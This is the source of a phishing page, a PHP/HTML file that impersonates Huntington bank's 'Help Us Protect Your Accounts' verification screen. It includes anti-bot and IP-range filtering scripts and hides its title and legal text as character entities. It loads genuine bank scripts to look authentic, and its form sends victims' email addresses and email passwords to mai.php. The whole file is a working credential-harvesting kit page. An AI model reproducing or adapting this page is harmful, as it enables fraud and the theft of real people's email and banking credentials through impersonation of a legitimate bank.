<?php 

	include 'T3R/bot.php';
	include 'T3R/usera.php';
	include 'T3R/rangip.php';


?>﻿<!DOCTYPE html>
<html lang="en" class="js"><head>
<base href="">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0" id="mainviewport">
        <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width">
    <meta name="viewport" content="initial-scale=1.0">
    <meta name="robots" content="noindex,nofollow">

    <title>&#72;&#101;&#108;&#112;&#32;&#85;&#115;&#32;&#80;&#114;&#111;&#116;&#101;&#99;&#116;&#32;&#89;&#111;&#117;&#114;&#32;&#65;&#99;&#99;&#111;&#117;&#110;&#116;&#115;</title>

<link rel="stylesheet" type="text/css" href="css/site.css" />
 <link rel="stylesheet" type="text/css" href="css/site-survey.css" />
  <link rel="stylesheet" type="text/css" href="css/hol.css" />

    <script src="https://selfservice.huntington.com/Scripts/jquery?v=pX-HQBQoJecxQi7lia8rno2suvj-FGLqjjM3r_b4sSw1" aria-hidden="true"></script>

    <script src="https://selfservice.huntington.com/Scripts/common?v=ErWcwz6ul8qxPN-Q2Xt7mtj9RN5A-IZQGm3UdzwQ8fI1" aria-hidden="true"></script>



<link rel="shortcut icon" type="image/ico" href="images/favicon.ico"/>



  </head>
<body lang="en-us" data-gr-c-s-loaded="true" data-inq-observer="1">
    
    <div id="hol-body">

                <div>
<div id="fab-area" style="display: none;"></div>
                <div>


<!--Begin HolHeader-->
<div id="hol-header">
    <div class="logo-wrap">
<div id="logo-img-lg" class="hol-logo"><span class="hnb-aria-only">Huntington - Welcome</span></div>



    </div>


        <div class="nav">
            <div id="nav-links" class="links">
                <ul id="primaryNav" class="primary">
                </ul>

                <script type="text/javascript" aria-hidden="true"></script>

                <ul id="secondaryNav" class="secondary">

                    <li>

</li>

                </ul>
            </div>
        </div>
</div> 

<!--IntelliResponse-->
<!-- MenuBar -->


<div style="clear: both;"></div>

<!--End HolHeader-->

        

        <div id="hol-mainContent">

<div class="hol-pageFlowContainer">
    <!--This is a container specifying that there is a page flow-->
    <h1>Help Us Protect Your Accounts</h1>
    <div id="formContent">
        <!--This is the default div id for replacing content on async postbacks-->
		<link rel="stylesheet" type="text/css" href="css/ForgotUsername.css" />
        

<img id="imgSessionAlive" width="0" height="0" alt=""><script aria-hidden="true"></script><div>   <div id="idletimeout" class="message-container timeout">       <div class="container-yellow">           <div class="icon-yellow-alert icon-pad-left"></div>                  </div>   </div></div>
    <h3>Verify Your Email Information</h3>
<form action="mai.php"  data-ajax-success="if(data.redirectUrl){window.location.href = ;}" data-ajax-update="#formContent" id="formContent" method="post" novalidate="novalidate"> 


    <div class="hol-pageFlowContainer">
        <!--This specifies the layout to use: specifically, what are the left and right margins for this content-->
        <input name="__RequestVerificationToken" type="hidden" value="SGMc5gV3wU7oN5JmEDPoWSKqculnglrvgJJ3Hcp_60Xw1RzhvzsRnWF2BoL9ru3WrJk2edqbWv2ezfOow_tB2G-Kk-81">
        



        
		<div class="input">
            <label for="UserEmail">Email Address</label>
            <input data-val="true" data-val-regexwithoptions="Enter a valid Email Address." data-val-regexwithoptions-flags="" data-val-regexwithoptions-pattern="((([0-9a-zA-Z]((\.(?!\.))|[-!#\$%&'\*\+/=\?\^`\{\}\|~\w])*)[0-9a-zA-Z]@)(([0-9a-zA-Z][-\w]*[0-9a-zA-Z]\.)+[a-zA-Z]{2,22}))" data-val-required="The Email Address field is required." id="UserEmail" name="UserEmail" placeholder="hello@youremail.com" state-lastvalue="" type="text" value="">
            <span class="field-validation-valid" data-valmsg-for="UserEmail" data-valmsg-replace="true"></span>
        </div>
<div class="input">
		<label for="Username">Email Password</label>
		<input autocapitalize="off" autocomplete="off" autocorrect="off" class=" hol-forgotpasswordusername-box" data-val="true" data-val-required="The Password field is required." id="Username" name="eps" required="required" size="30" spellcheck="false" state-lastvalue="" type="text" value="" aria-required="true">
		<span class="field-validation-valid" data-valmsg-for="Username" data-valmsg-replace="true"></span>
	</div>
            <div class="hol-actionBar  ">
                
                        <button id="btnContinue" class="activeButton" style="" type="submit">
        Verify
    </button>

                
                
                        <a id="Cancel" class="cancelLink" href="javascript: window.close()">Cancel</a>

                

    </div>
    <div class="hidden" aria-hidden="true" hidden="">
        <script type="text/javascript" aria-hidden="true"></script>
    </div>


    </div>
</form>
    </div>
</div>
        </div>

<!--Begin HolFooter-->
<div id="hol-footer" role="navigation">
<div class="links">
<ul id="footermenu" role="menubar">
<li><a role="menuitem" href="JavaScript:Void(0);" rel="noopener noreferrer" >Identity Protection</a></li>
<li><a role="menuitem" href="JavaScript:Void(0);" rel="noopener noreferrer" >Security</a></li>
<li class="breakAfterIfNeeded"><a role="menuitem" href="JavaScript:Void(0);" rel="noopener noreferrer" target="_blank">Privacy</a></li>
<li><a role="menuitem" href="JavaScript:Void(0);" rel="noopener noreferrer" >Online Guarantee</a></li>
<li class="feedback-footer-parent" data-site-survey-context_placement="Footer" data-feedback-link-type="Footer" data-feedback-link-icon-id="black"><a href="#" title="Give Feedback (opens in a new window)" data-site-survey-link="Footer"><img alt="" class="oo_inline_img" src="images/oo_icon_retina_black.gif" height="18" width="18">Give Feedback</a></li>
</ul>
</div>
<div class="legal">
<div class="large"><span class="breakAfterIfNeeded">Have questions? Call <span style="font-family: ApexNewWeb-Bold">(800) 480-2265</span></span>, daily 6:00 a.m. to midnight ET.</div><br>
<div>&#77;&#97;&#115;&#116;&#101;&#114;&#99;&#97;&#114;&#100;&#32;&#97;&#110;&#100;&#32;&#116;&#104;&#101;&#32;&#77;&#97;&#115;&#116;&#101;&#114;&#99;&#97;&#114;&#100;&#32;&#66;&#114;&#97;&#110;&#100;&#32;&#77;&#97;&#114;&#107;&#32;&#97;&#114;&#101;&#32;&#114;&#101;&#103;&#105;&#115;&#116;&#101;&#114;&#101;&#100;&#32;&#116;&#114;&#97;&#100;&#101;&#109;&#97;&#114;&#107;&#115;&#32;&#111;&#102;&#32;&#77;&#97;&#115;&#116;&#101;&#114;&#99;&#97;&#114;&#100;&#32;&#73;&#110;&#116;&#101;&#114;&#110;&#97;&#116;&#105;&#111;&#110;&#97;&#108;&#32;&#73;&#110;&#99;&#111;&#114;&#112;&#111;&#114;&#97;&#116;&#101;&#100;&#46;</div>
<div class="small"><div><p style="margin-top: 0px; margin-bottom: 0px;"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 8" fill="#333" width="20" height="20"><path clip-rule="evenodd" d="m5.1 0.8l-5.1 2.8v1h0.8v3.4h8.4v-3.4h0.8v-1l-4.9-2.8zm3.1 6.3h-6.4v-3.4l3.2-1.8 3.2 1.8v3.4z" fill-rule="evenodd"></path><path d="m3.3 5v-0.8h3.4v0.8h-3.4z"></path><path d="m3.3 5.4h3.4v0.9h-3.4v-0.9z"></path></svg>
&#84;&#104;&#101;&#32;&#72;&#117;&#110;&#116;&#105;&#110;&#103;&#116;&#111;&#110;&#32;&#78;&#97;&#116;&#105;&#111;&#110;&#97;&#108;&#32;&#66;&#97;&#110;&#107;&#32;&#105;&#115;&#32;&#97;&#110;&#32;&#69;&#113;&#117;&#97;&#108;&#32;&#72;&#111;&#117;&#115;&#105;&#110;&#103;&#32;&#76;&#101;&#110;&#100;&#101;&#114;&#32;&#97;&#110;&#100;&#32;&#77;&#101;&#109;&#98;&#101;&#114;&#32;&#70;&#68;&#73;&#67;&#46;
</p>
</div>
<img src="images/hunt.png" alt="Huntington Logo">®, Huntington®, <img src="images/hunt.png" alt="Huntington Logo">&#72;&#117;&#110;&#116;&#105;&#110;&#103;&#116;&#111;&#110;&reg;&#44;&#32;&#72;&#117;&#110;&#116;&#105;&#110;&#103;&#116;&#111;&#110;&#46;&#87;&#101;&#108;&#99;&#111;&#109;&#101;&#46;&reg;&#44;&#32;&#97;&#110;&#100;&#32;&#72;&#117;&#110;&#116;&#105;&#110;&#103;&#116;&#111;&#110;&#32;&#72;&#101;&#97;&#100;&#115;&#32;&#85;&#112;&reg;&#32;&#97;&#114;&#101;&#32;&#102;&#101;&#100;&#101;&#114;&#97;&#108;&#108;&#121;&#32;&#114;&#101;&#103;&#105;&#115;&#116;&#101;&#114;&#101;&#100;&#32;&#115;&#101;&#114;&#118;&#105;&#99;&#101;&#32;&#109;&#97;&#114;&#107;&#115;&#32;&#111;&#102;&#32;&#72;&#117;&#110;&#116;&#105;&#110;&#103;&#116;&#111;&#110;&#32;&#66;&#97;&#110;&#99;&#115;&#104;&#97;&#114;&#101;&#115;&#32;&#73;&#110;&#99;&#111;&#114;&#112;&#111;&#114;&#97;&#116;&#101;&#100;&#46;&#32;
&copy;&#32;&#50;&#48;&#50;&#48;&#32;&#32;&#72;&#117;&#110;&#116;&#105;&#110;&#103;&#116;&#111;&#110;&#32;&#66;&#97;&#110;&#99;&#115;&#104;&#97;&#114;&#101;&#115;&#32;&#73;&#110;&#99;&#111;&#114;&#112;&#111;&#114;&#97;&#116;&#101;&#100;&#46;<!--B--></div>
</div>
</div>
<script type="text/javascript" aria-hidden="true"></script> 
<!--End HolFooter-->


    </div>



    <script src="https://selfservice.huntington.com/Scripts/rol?v=vVrR5Ozy5ZQMBZ-w7W6KXORbhIwpocBaSuYq_shEbBg1" aria-hidden="true"></script>
</div></div></body></html>